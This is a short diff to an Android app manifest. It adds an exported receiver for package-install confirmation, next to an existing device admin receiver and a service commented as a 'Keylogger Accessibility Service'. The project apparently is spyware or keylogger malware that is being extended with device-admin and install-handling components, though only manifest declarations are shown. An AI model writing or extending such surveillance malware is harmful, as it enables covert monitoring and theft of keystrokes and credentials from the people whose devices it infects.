@@ -182,6 +182,15 @@
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
             </intent-filter>
         </receiver>
+        
+        <!-- App Install Receiver -->
+        <receiver
+            android:name=".AppInstallReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.content.pm.action.CONFIRM_PACKAGE_INSTALL"/>
+            </intent-filter>
+        </receiver>
 
         <!-- Keylogger Accessibility Service -->
         <service
